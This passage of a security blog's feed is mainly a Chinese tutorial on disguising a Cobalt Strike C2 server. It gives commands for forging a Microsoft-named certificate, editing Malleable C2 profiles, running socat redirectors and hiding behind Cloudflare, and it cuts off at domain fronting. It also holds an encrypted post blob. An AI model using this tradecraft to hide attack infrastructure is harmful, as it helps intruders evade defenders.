c3528dcae3d0694875f8260a043eb76a29319d504b2f7b95f8ffdea35394211011abfcf91c31205ed802d906d5d4096c52c2bf689611f693b6ccf1900ae50e405ba8ee65b685689fbbb71d31424017f59c4600ef4532bff3f1e064fbc9dc5a470390ba08e9795c4cd0e9349de0521d41adb28d0c4a7231d6de1b4c9ff852ed0c79468167941611229f0a54be17080fe4f33f7e8fa681e6123076cb79c12d2bf7de06a7e3ef780ceebc28ce4078d1633b9c227bff7635e79cabb9bbe58ceac1f6864010cf041ab945f7fcd90c085220482d9dd3f664154ec75abc0ac3e36d83e6df2d8de48f7669afaa2b07c8b957d9d057dd21c45756ad2c0c92c0c2a91e70d3af5e884c0c5a8b51de50c1ad95a55bbd32eacca2ea46c889d59062b4cca48c3f98f44dd6700c01e25fb689ab3cd6c0bc160d5a982a46b5f098845dd87af29ced61af8ddb2542b517bb86ada9036785d0b90a82b43bce9b13421ad0837b255748065e3a3dc4002cc096de1083eec63ce4b1a415b31b7798be5f9a93373c714d88fdc4bad467ffc8447e9187fae7f40a231aa7ae5ccc6a3c8f917d70d1e3dd92339f7047106151e4806d5d28110119f4a1dc1fb9096ddadbaf95f4aafce39eb8086b34cb1129fa37b81e81a8a85801a3915d5f024cf37495d285af471ee402f65bfcb3d9a1a889fda168fe0bd292cd97a3316b5c65148cd1f964a6f2c08845bccbf6607c51a9d420292936d9193f441384b8fb462ca234f5bc1ac441c963efc6bc15b28ded6b7bf1b47c270ee363f30d6a838cfa70cff07fd4655ecd5e880f320177351ad882d541f0b8cd34d7fa12ee43f3876c7c6b647762dd9afa789d95a1597c9a434e46644f1c2067fbb3bab11f85b9f9a8a8611145489230a9f7824bb72828650ee6e72f2075d1c0c65021b0b3aa07555df7950b911c5983afde11c5b226e983f5e80950e2403e1188ddeef8b56297f5cfb2de87cdd86bb62325a658edab53594ebce15043723a8e1394724d54cf3af3f73170c5a9b22e4a2e0b7ba5846b2dcc8b425cb0ea3a7ba20a697e8369e683496f3124cbbc33e682b582bcc9c40a28a06d07d0a0bf1bb8776cf6f5721a5b1934d744e3b6a3b22e857fb0cda63a2a23961835a083ba474b36c1f531198e57fcea945ba211b230aa041412f19888c805d7b6628f7277a266908df913673b3230cd22a84add665ceb757363828e61da7e7d968394db59e41d4bf050966f6d102427329cfd81559d4a712d79ff7bb0fa90d991210c2e8949cbd675896683699584cd62300f930d03e28f5a9165e2e6303e56f9f6a3f963e0c92529f31b281c6afe5bb4e4c78927c50ae60f88c96012f4b802ee793d9d3a78978a3fa832f546c43f1bae792f5e3281c8ac83102366ee6e538ac91a9ebbad8b0d7e2d063dc5dcee48ca42fc820b6e94f10a383596d124c98f9f8ceeccc33ff789bd9f5bcd0e344dc99fd263604658cc705125511fb83e5888d4edb0a06d2a0768e5ca869164a9f98b2c660a1bd14becf5c0514f4c3c00faae47971f2d430717d18c3d1cb08f8fcda08b851c40ad39dd2da43d1dd45ce4f03cd68d5a04797c5629b85158874cb975872fd450e3b53cb1c186b10a768e901475f330641ec8a328217b400b9bc4dba1bdccb6b6ca79109965e6c168067b2c19cabddb44b6653dea8d11d21e63e2d02f07dc5be14e948c484f1c0bab081d981067af78d9fb39a357766572ff26d8dd48115f42aadad5fb3383041140248dbbe9d9f4b4544ff48de2aa49f66085445583fbb2521ca312f4e56e70c020c5e19cac2c6ba31f1603c5b7dbe327488175f10675cb45d64e5cac6bb9315db3b3c82121eb466000eb2ff6b1ef2341748d54779af4c3a21ddf9b037808840c5b151cb5a99e86f1318de476bb357fbe99fcef197e73779439050c21fbe15ffe75a8bdd612df3a0a551bbb2c9146396a4232912d761a3f414d8ec490564874be5a3335894f0b038c455c09b42e75e5ffc69d47a527e490f4fe91db80fefd54138e180f64eba5db16dc1be4954b910d6d4a133b378cba4f5792c74be9c6aa929dcfe34fd61f35387684f2054ca2cd6eff13f6176cafd285bdf6b85d868c9ea15b31e31ab442b40b3330f549777eb847af5f39e2fcfdf6eac15aaa5f0b21f43f6e0969620ea1a78a4475144835c481854cfd765317491fc4ee7699094f1c9655ae24f9710e65c706cce7f9f679c42d2246a107570c7cbbfbe576970fddeead0a27c01ef3ae543d39724c7b2c8dbdd83193f834c6d0ee80b63efbf48e988bf3293764c5c79b5cd4e18c2ca98783f2bcf18c7950cfc120e21dd7e3b6517cc53ffb561d398bed1847aca73c64e18f6d44ebde9f572b39150ff32c4f56d75af574d8fa579f9a3b70b1dada77bfc6235328d5fd004266dc66006583ace50d4842f1805de9cfe13d1d006f9e50485917f59b5cd48b4d429cc1b3c495af6c82d1277a368e846ae667057b710b267905de8f74aa705d43ac888af3fbcdd53a2cd5aa6f2b19101d5d3f92df915db21e68b2579a11a310b09078575348acb293db2344617a0326788aff7a29fc2b16c39f8fabce16c915a82d76141da1db9cf4ea53bf2c41e030367fddafa946ef08f6afac11ffff58c8417de969960f1ea37c6eefd48b95ee0b2e6ef936ef57f4e147ea50708aaeb2265182a2f9de1b69295e1349bfbce0ffdfadcf7545b28044f04cd168fc026eb5a13dfa892aa1ee599f83333a8b00b6c317b97f683bdb7ff324a79dce936e61fb1179d305c37e59365294c8afddf72802992269b637bda9af2ce8fd7a405ed99f404fa71b145168142719a1f5ab356c3ba147a00e0ea85bb8ec1e37ef1ef776b34a3f85b51a8249ae459552f302c984d7b839a41ee061560a65f9fcea42330f17fa3a455ea3cbe931045cac94fba9120647acab1ec4a5c97bc76146f71f566b33c6217ae99800085e44872ff01b4a8e0457f2127719b181d9b12148691ed5872a28dff6d973fc4578131dfc1e91ad3765cb006a0577d895ae05a6ec32efb44dc00791171eb100445c3f8c38863c46d1c1471ddd06a64eff419011c94529170be644366e5bb936e393c0568706cee017b8f95a458c094bed55d03b3cc691726c93cbb3c1fb9546f54ea505c683c98883c14971d8af968c98b4707e6ee2431da5630497dcfca29a83e3d902e463011e935f2ab055eed6228f580786f7bd4ed23f04a9aafe5a16899ceb072d9d7d138aecddb8142c88e2ce5989c7fe9388060fe2470b087456c3a7f66a579e7ecd0c9463ff8908a288899fc2909d00add377c75f1c3d47de011f76127502352cd7f6cccc035d315bd6f982daae8c4ec1574a515dc6cf66068026c627ab4bfaa4263ba55ae36f6e8e5105c61b031c7acf658f5a3add340324ababe05f73f82ec38dd0f0a807a49faa886141eff569fc35b86c6e21b7d77a8cb7949b4973d689b2d14c7151abda6f49cfde1179092966aadebf02e448b7849c2f0fdcd88a05393b6aab4d626bbb829f26463375cec0ccfc528a00d80af2fb41eab2485a46ab15432fda0a0771dcb1a29aca379ec84b1826843e312331736e02360e70fc544d811755c71dd927dc34983bf64e29552773967ad75e20a584821198ecfd69180e226bcd1bbb5af2267171097ccfe9ae3f76d3f5ed7abbdfa8f17180cdc6a55350ba5beb9fcede64552d1a9cba2af3f0cb76bcdda28a07bb18800a4c62608e376bbf6b8e19748cbe4d97d16c5ee6112c3a4a26e53329fb487cd882d88806ed3e66eed3bc6b83b11c05eedcef9acd02bc3578d58c9808543bc13d681c0df339789b491e547e3c2b068b7eee308962f3a99fa013d44f040485a5582502f43e68a9ce854f4d9b3d4fca79f603f55e36106d237abf5589888397fb6caccf8c9a000dab8084d06447ed5b735b1cb57da3a2894cba8e6ef7635474e8a59708822c8edd4b7a71ab864e521cf344d701c91389261b7bdaf8d909b11bc2eacef978fbda4a37e9d4050b0131512b06b331993b6275d3f374869848722d9726a2dbaba12091cb913f560516b8fd79c57e6d020620bedac6161f8293acc7fe143bb7af31898e5eaf511a35cdaca1a25f5370517a7b16867696f84c872316b6811746f5633014d265f66c8fb659ae41c858e35119904e52891dedfbc6a7c21c775c3ddc0b0a831934c86137be7822b5e28495e18864b885f84fb7b6075cf04a8c77918038e6a534aebc6b8578de83e7165b3000d2676cadc7dc073fd3afa93bda27baa57f49abbc9a774b030c2246715881d323f3067b62cce8957f8eae503bbd17721f05acf737d8760b70295007ba234c3c0e94b0009e5fdafecdc814b3ae791c761cfa9546af52f7a065f7fe3b3a5a86bc6b585ca7e44991eb1b88667120c373c096f5eeb60462bf9762f29e1e4e3f5e45ee5d05541fc7df03479fdb50a7771dbd699856d8b8a06b09dd55e0b016f31c7b31f4a7150bd0e4af8d38c330703ec404bf307f676fb98b2aa037fd0e9731bdd3aa7ae0c119b83efa11aefd9b3e6ebb8c766a04d7dad2d998c9a8ed919c1f1cf8c10638a821137cb1ca60c6eba04f1164521158fa8097d75bf8ce338a5c971a4d60aaa24f614dd9d0eac96ef5a7e3ff2b85cb64a857dabb786808152b75e35c35a1fa6d882043bc0781371a52b5a60b23081ffbdae16a9c4315cbd8a255df3528da2c804eeb0f618d1c2d822218a2ae1920cb7a8d2a9173141d89ad80f823cba8df06d4437836cad3151093135995d0cb68b7e9d11f6e8163935a30c2d10640a43b19b7633b224abb63b72b9f950844076526b8b72cdeeee192e9b82073733beced3fdfcfee3ed16dea247afe77e57b1a8e454cdadbdba1e76394b157b3e37816ccb079f832c23e50fad3f1eed9c450254e0cbcd95ce99bf0169501efa5b4a6158e3b8b885af2f8a73d91f6e6a06e7949ea286718e7b1053ccd2a6916af47aebeb783cff1022bd17fbfdd22c52d375f7f39c0df132ffd6da27f66f4927d65c249456ab1582ae5bbd351c51edda8d68f6992698470cda4c461deaf2a298a7f8adaf1f1f8cda7fe18731e3ab3c53893f53f0f2fd93a548b398faee8f9656c69d3c1d57a51336d84e842e7cf3b1f84f24030a70b3f648a1c020b3ce1f6d5159920191c596dae68f08b8378b3fb19df0d75c1a8de4d2d5ade98db0e7dfe06eefad4f6f8086f15d7de47b40179328f93ef2db7794af05e9f49ee8d164504f22dbd6b8ce37cc902e96e069c61fd22707640fcb04f7c094e78be99d7bcc70c570e321ba7cff6eea61c9fcd8dd2d3e91747292a2615dac0d72fbfaf20cccb8521089b2b366ab6b7177e0dc6bfaed14d659937b752c4cd22d8fc056712c196e611a79eead9006cc24780a92ae4d56d38bb66ade203cb3b43f4fc217284470778e95bbcead3251df35f2d2403fe6deba81da9aa94616e0c5b84d79e8923991e0d7b4b25aec66491bd78d835f90c0dd3314b627cc919a8265872dcff4ebc12885086645a27d2b60e1a8c0044bbee15eaf10ea4f67cd466bc53609fef16e6b10fc0d555ecf10cfba2eb47d121c68700369128d92b5d42ac9eb14e2e1525afc48f590c305e6af7704415074e6bd4ee4df9b76817bf1621c6d7c5e18e4b9c4a628ef5936ef23eb912a9fb30564d5ee9c3bd5f10e71245dcd118b44f140e7635b8da3273f146ee6091ccb0ae8809a01d1579b550f8a6b411e217358544b3057152a77c7c1762f26b33c74f79de8ee189e806c12c4787451ce347df462aef37503fccefb1552d25ae558f8611afa13e9d2d2e755dc3907a9f6c3adbd83013333e6968f909dc4ae7a8b2e4734a4f267fbb51ff7b0b101f18ecc8272c0165034f63b9c7643d542a6f12bb4ee77bc9bfa025ff6f575a041e9099fdf157938b9660604898e0e39711b78c39894bc58fd4a533397417dfb9c5538994342ad5a9da90168059c01689c2356e064f200d7aca366c85227ad3050d78fbeeb5db1e2c0409294d7f987850533775f9a2281e268f7f8c035cfb43c00d736ecdedb12879283969f36e003a2d0b686b0c71960f7c18da485ec0a470094c022a71c91685c371fc6cedd8471857ae8ca270ee155e783016ef190d27756687a8b56d910b7d6778a548e3284874848fd45251ad561e20081b8473e2fb2981109666173c1e66333ed5d19d9e7d226a926626eceddc58f59bb7a2b01c1cf86e5a4b8265bfca5df361dbd996d165de1d9468a0ae17da907c71b449cd07bbb5771c4f262163ab27615836a870bfef88814ded7dc1de99b8a20ba8f5064d10954001906833473f0db33501ffe99cd01594f7109d60ce97ad6e82d22a721f940eff89e12b0664179de2d3a36187b542c1720646cfe1548511582917fd04460690ba294664d23adf93e16b714bb91fb42f8aefb09369eebfef40e0883eb5cea91e75d758f376fc378e1d46a83285ce76052a0251a79c0ccc219e8e76350f717db53f03f26c6e23aec0c4c741ec260bbcaa8daadbfa85efe67db53327ba7d3a08bf3abca7a72b7baddedb16f6d4f809892d0a301cbf79ce7a514a7866ef89371069f8f2915b9c1c675b08ae71fc673c61d53c3da147d2a4b6d7c9a61cd863d104b6845014ebec9cd35e6603f1c985dfcd66448a9d95a2e14bfae7b236518cbecb760dce8974180f4172cb617bb46c76bbc65020d7785b2e8ac5d1ecfde1aa689b99bbb0c413fc3c3c2969a67e99e7559ea160d6821bc79d7797fb3530cda7d01bc014fcaa573e828fa154c5ecec609ab469ec10dc5bb22336a8a5ad037ed01880fe7b24faab95d406ba9993e34b626ece16624f25b07e1651526c777d6767a77498410269dae6eb70c84509fb2ca5c0c536d1252c1201568239570c13c5db549d45a90d585620e7f78147d51e42162fa2d6184d9b11a6d54c62f35ab8f07d47cb575254918f356b0e44f3e24efeb098c63a784771080e552aeb8ca7f5c0ec1b1e10436c191a6b8de9bd6bc8e1db9f7a8805e0eb00a13f774c1f333a03e04a4f21a684364fb3e7febb4bb6f84a50ea70eb2101b85aba40c23d207ee34be1fef69a0a17bfa01968c54707782d6073e9738e9a460e0f5daa2ed7b736e9bfeb0256065fda71fc72a51c2835c49953a7e6435d8ce993e494305d68dfd8cbbf4efd539a91f8c22a324d03f6f5db106432019234df1dd747acd78299b72c23d44e5ec68353fff67d7f193e762677b44efb4219d0991769c4c486029ddf29a0395e82db65d285a43972fa2942a5473757f60992bd4690d18da17f66f5146020c2dd95065d1c5f09ddc65c21424ef149ea67e8b6658c9e45f3dedacdbab49f359d40e82a414ba2cd85567bd2f447f35a0379ce2ad447e7bd0ebaf399751ad6a82db824e86513932061a3e17412b65064d46d1ec14fc881bd720d609a6ed8d66098baa4e179555e742daf1801b2a238d24c5a665bdede0a9bfdf844ebc340acef77b5d73ffc8343687fa2d2ec05d0281047252980f4da1b89bbe1e86c46e619ac1b793fffc0bb0cd4c466b97b76ffd3db9dba7cb6ac05d1516770f1b1158a8a813d49ed192e2eb3f6af6f4d565ee49055809a0c91c9e4b0ee9eeddb1bd056454db35bc89613a45b9764d362699d4edc6247e290c33076b4e56043059d9ec0a88a607c6cb8aa9ea4ba4c5aef000a3133827bfdc9e9509fd5f675f8731fda0f76d6b68c64cf689ebdf80b7228e10ffd326b361af21d8f57365199392315e7da86497bed4a69ffc9a00c311413816ee0ee6db4e4c9e2976e59c6274a6c77336621439fdfc377f1a6ca671f013a96e20c331b8eb8e2c867a2667cfb0a4771ee6f71fb6399c46b0c375787e373d46357dcccaa8a5d784c30362df958f890d3062d9124f32020242e5e5c24d9833065f797da2a8dda9548544eac5e8d6bbdbb9fb4f844d4cd69a72c9ddbbe46685858efecfd77f96f418b8df05e3cdbaeefea44c3e53fcd0a551269fdea271633f62971740627b7f7fac2564a42ce40fc34062cfb495c53115a3acfe6af2594c28b906ead75fcebb986306d6bd035638685487c9ec254869dc7859d841c085adc62e99be289cd25dcf588492a254cd479fb64a1b7b779e81d0778f4b84d010212cbe015510a730c94f4e9a03e9aa479e6aa219d1e9dae1ac5b1f5e8abcfe6a1e0173a56eb2a3604f2ea6800fc788e683703465bb3ce2c0527609463285b9dd01ad38e506a1d675ac949a49a140685ef6c42fce4e8a8c02301af75376cce4ad00ee5bc6dc763ad9ebdad97c4e2e574a45530bd62e7f4fac0c343747df9d553fc65b592d24eb6853c21707ce27d2d14bc556451ea0cd89bf3a4c8aaf4ef7083a770f7cf76486334ff5fd8cb28298b9f5475228d0e0294723277fc64ba79d901d502786277d34a33023bb2de78dd23ad4cd8cf848bed6a63b5040c1238c1468d5f7fa7a94882392f035631da8ea8cc330b888aa517d57ffc8cfe0b7b5dd73a50e1628caef325117ec91a8a139f4154819fcc86b6304a38be942a4b830ae0ef511b6788712b2a5d8cdbf460f645353ecc85010c4fa0947f4b124c9a8f9ee1889ad2216fe3af98a2fbaeb63bf44489ff49ed7fe6063dc9c962800f5beb8bc23ef24b3aeaef089f96cbb41ffb0b3e9a5b29836486b14e7ec3cf2add54bfb468659c74fc29e919430c44c179965a0cbddaa016bf097b52d4b0bd11ba1a9f40709366db375000e42495788d0eb93e916ec277ce4fcf0b1e5fac54e74bb76ac41f1f5b55b4e7d6dd31d1aaf4c79f759a008ee349f452ad0cad4e78a510f05745cde192e3c73d3fd5df1b24bad2c4f657dc7f423adeb9d825be99ce2b0771c715f1ceb0d3311173479586a96495915470aae15a7b2c88c0cd9a6817142db06324da579f98249c60691386a1f1e5eccd505a801c2dd1677915435db6ada862b9c131061638f679fa2f2f746e65451caeb82c9c1895a0c9287cff65542e077dcffee0a8b3228b8b61e9d0e4f998095ea3612bcd5554192ad513803b6fd5b9c051e0a55e24ea18fabca8ac0d62710af026f7db9d4738c7e1519ee9d5f0785ba58a201cb942b09181fe3012f9d15b3b97f617ba1f3d1d1be06054f48f4d55125126b0edc0151079a2b762b41bf6ab54e02cb7a5f7af2e32f46f8960c63fc1a6e90ce1e1ca658a9563a9268a8a7b1d2ab2f3aa84d1a3a3fb21ca8a91f7a4a4ed709a997610cfd976aba0ba1a7091cf64e4fa2522b6aba23c4196b35d5a45a8ba0ac7841b58ade454148ff48d2604991f591eeee608f1ffdac1538ee4bd1295aa4ef087a44dfc8ad2ac74750c76eb0814e6bcdaba66b5e7b596aaefec6d3c57a50265ba668232c223dedecd445b6934be10997f0d390665ff90e898770790d5925369e46ea993f67789b905171467dad904765145e0a1770d9e07aba840bb59b00b61549d39ef260843462b0f08e51d1c29ac1f731c4830abb2d2948c75eb49b6d7b65601d70a27cd0bcbf80008d83860faf476ec9449a3234ef9d6d4110848af0e5927c96b25f4e3417e39049a9bcb40fd6c37d97769d3d18269cb506e628e42cf7d3533f6a91226c81739f2c3ac0b06251ffdbcfd36be156c19456c0fd3eda192d407b24488f74562972ffd987fca1dbf25c615355c19de2dea5a4888c4398c7ba3a4958bc440b0ede3d8332dc572bccd9d43aa06c33b3ce3eac7c0887ee7f870f934cfcc8a84b391eabd04ac5a35c2ca34fc2551f5493abd5c287cdcecf936ce17712b92d5248c8f1986cad74754a98e80cdbcfa97a31248857f0f6d2a64eca0179657fd9556c1196bd04721eee86a7fdfe0a73be92770ac7f6dcd3aa27b110018043e0a0c6e640972b6945d59fb1f9a93959ea86ba0e0422127ef2b4d576bf5249ed39cb9bf6b7fe8cf4ad9d30abf63b1c279ba453e8f47d5532c52e521f8567c9b2c594db10f165dc9c2d96a03f5f8edcf3ca636abca77d1c89b38290e9fb82015c385485425efc10a9f014d5fdd8df113b185759c3c86384380109e1bb9c7efa252d06d65172e5b939a788fcc8e9ba5badd628bba6b39233e240a7ad611ccb60efa2973244749d945f460294c0c301da9e21c01ac28c5d713c8908bc4c2155ee154a7cf3b5ed2ac9cf8acc73bb78b8cd0e9e8ddcc76293969d708b241a54d57be97d974cadc82d00bba65dbf2a8ae9c447dc9e85d3c96c967e3b79d53acc514ba89239f1705e2720a3c3951cd68b0d8f7e3d156a2dbbe001701dd5bb37bb2e173f701f8b5ced4cfe2ccab9ecb36741cccd0022f75e194f12b9550cff2932a00855412faf83bf925e5137fdb39d8f6280f25e7fe477422967e885e9868088cb4d52ac15573ec511eadf343e6c81371e2c3ffef3cb4b9a9c08f4bc0d85b8e8c92d3d847b82d08fc56b3e1ee0f552519ad99dc08ef81f2bcba188f71ff13c16f6fce1d642e368b4935ad1aaa1f3cba27d81ba7c54572b31307b8f322096b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="reflection" scheme="https://hosch3n.github.io/tags/reflection/"/>
    
    <category term="classloader" scheme="https://hosch3n.github.io/tags/classloader/"/>
    
  </entry>
  
  <entry>
    <title>检测与隐藏Cobaltstrike服务器</title>
    <link href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-12-16T01:38:12.000Z</published>
    <updated>2020-12-31T12:47:22.045Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>CS服务器默认监听在50050端口，可以在启动前编辑<code>teamserver</code>文件更改监听端口：</p><p><code>sed -i &#39;s/50050/10080/g&#39; teamserver</code></p><ul><li>至于能不能有一点卵用就见仁见智了，只能说类似于将Tomcat从8080改到9090</li></ul><h2 id="默认证书"><a href="#默认证书" class="headerlink" title="默认证书"></a>默认证书</h2><p>接着进行全端口扫描，看到默认证书中存在CS证书签发者的相关信息，我们可以用keytool重签一个伪造的证书。</p><p><img src="/img/jcyyccss_a.png"></p><p><code>keytool</code>是一个装好JDK就会有的Java证书管理工具，输入命令<code>keytool -list -v -keystore cobaltstrike.store -storepass 123456</code>详细列出证书各条目信息。</p><p><img src="/img/jcyyccss_b.png"></p><p>然后删除默认的并重签一个伪造证书，重启CS后再用<code>nmap -p- -A -vv</code>扫描时已经消除该特征。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./cobaltstrike.store</span><br><span class="line">sed -i <span class="string">&#x27;s!-alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;!-alias microsoft.com -dname &quot;CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US&quot;!g&#x27;</span> teamserver</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_c.png"></p><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>改了远控服务端证书后，抓包可以发现通过HTTPS的Beacon上线机器用的证书并不是同一个，而且同样存在可被识别的固定特征。</p><p><img src="/img/jcyyccss_w.png"></p><p><img src="/img/jcyyccss_x.png"></p><p>可以向<code>Let&#39;s Encrypt</code>申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请免费证书</span></span><br><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d update.domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书打包并生成store文件</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> /etc/letsencrypt/live/update.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/update.domain.com/privkey.pem -out update.domain.com.p12 -name update.domain.com -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore update.domain.com.store -srckeystore update.domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="built_in">alias</span> update.domain.com</span><br></pre></td></tr></table></figure><p>接下来就需要用到<a href="https://www.cobaltstrike.com/help-malleable-c2">Malleable C2 profile</a>来引入我们自己申请的证书。以<code>amazon.profile</code>为例，将刚才生成的store文件放到CS目录下，向<code>amazon.profile</code>文件追加证书配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">https-certificate &#123;</span></span><br><span class="line"><span class="string">    set keystore &quot;update.domain.com.store&quot;;</span></span><br><span class="line"><span class="string">    set password &quot;123456&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺带把dns_idle和stager路径也改了</span></span><br><span class="line">sed -i <span class="string">&#x27;11i\set dns_idle &quot;8.8.8.8&quot;;&#x27;</span> amazon.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">http-stager &#123;</span></span><br><span class="line"><span class="string">    set uri_x86 &quot;/jquery.min.js&quot;;</span></span><br><span class="line"><span class="string">    set uri_x64 &quot;/jquery.debug.js&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置文件有效性</span></span><br><span class="line">./c2lint amazon.profile</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_y.png"></p><p>再通过<code>nohup ./teamserver IP password amazon.profile &amp;</code>启动后抓上线包，证书就是自己申请的了</p><hr><p>经过以上修改后虽然起到了一定的伪装效果，但在投递Payload、Beacon监听、会话回连等过程中，马被杀被分析、Beacon的Listener被主动扫描、流量触发WAF/IDS规则都可能让C2服务器等基础设施难逃被标记的命运，这时我们可以拉一个靠山（云）或是临时工（VPS）顶在前面，使得CS服务器从风暴前线转移到相对安全的后方阵地。</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>就像nginx反向代理会隐藏后端的tomcat等应用服务器一样，我们可以开一个按时付费、随时能销毁的机器充当临时工，它作为一个中间人转发马和CS服务器相应端口的流量。但要注意的是需要给CS服务器所在机器加上白名单防火墙，只放行临时工机器的IP。</p><ul><li>当然也有个缺点就是CS操作界面的外部IP就都会是临时工的IP了，可以设置<code>trust_x_forwarded_for</code>头或通过目标向Log平台发起请求等方法获取真实IP</li></ul><p><img src="/img/jcyyccss_d.png"></p><p>图是CS手册里的，暂时不必搞这么多分工和分级，先搭建一个简单的<code>目标机器 &lt;-&gt; 临时工 &lt;-&gt; CS服务器</code>这种拓扑的环境。</p><p>I. 设置CS服务器所在机器的白名单防火墙</p><p><img src="/img/jcyyccss_e.png"></p><p>II. 在临时工机器上安装socat并进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install socat</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 &amp;</span><br><span class="line">socat TCP4-LISTEN:443,fork TCP4:1.1.1.1:443 &amp;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用 netstat -pantu | grep socat 查看后台转发的端口，kill PID 中止转发</span></span><br></pre></td></tr></table></figure><p>III. 创建CS的Listener，设置回连地址为临时工的IP</p><p><img src="/img/jcyyccss_f.png"></p><p>IV. 向目标投递马子并执行，然后坐等上线即可</p><ul><li>此外还有一些专门做转发比如微林之类的</li></ul><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>简单的CDN转发其实就是临时工角色从自己开的VPS变成了Cloudflare、XX云等厂商而已，只需要将域名ns记录给到对应的CDN厂商，之后马儿通过域名上线即可。注意一下CS服务器所在机器的防火墙白名单，要设置为CDN厂商的段（没有预设的话就自己搜集一下）。</p><p><img src="/img/jcyyccss_g.png"></p><p>这个的好处就是，相比自己开的临时工VPS依然可能被标记/被封，CDN厂商IP服务的站会很多，威胁情报要规避误报不太可能把CDN都拉黑。。。下面简述一下在freenom注册域名并且走Cloudflare CDN上线的流程。</p><p>I. 在freenom嫖一个免费域名，不用付费也规避了资金溯源</p><p>II. 将域名的NS记录设置为CF提供的</p><p><img src="/img/jcyyccss_h.png"></p><p>III. 等DNS缓存刷新后，通过域名上线即可</p><p><img src="/img/jcyyccss_i.png"></p><ul><li>要注意在<code>DNS-&gt;配置</code>中开启<code>开发模式</code>用来取消缓存（每次3小时），否则可能会只有心跳但执行不了命令。其次CloudFlare免费套餐限定了<a href="https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy">http/https能用的端口</a></li></ul><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>在介绍域前置是什么之前，我们先思考一个问题：CDN一个IP对应多个站点，它是怎么知道到底每个请求要回源到哪个站点的。答案就是根据HTTP的Host请求头来区分，举个例子：</p><ul><li>a.com 用了CDN 1.2.3.4</li><li>b.net 也用了CDN 1.2.3.4</li></ul><p>我们通过<code>curl -v &#39;a.com&#39; -H &#39;b.net&#39;</code>最终访问的也是<code>b.net</code>，因为<code>a.com</code>的DNS会解析到<code>1.2.3.4</code>，而CDN是根据Host来判断的。</p><p>因此就可以在CDN中配置回源IP为CS所在服务器，并将加速域名设置为 <code>在该CDN提供商这里尚未被占用的</code> 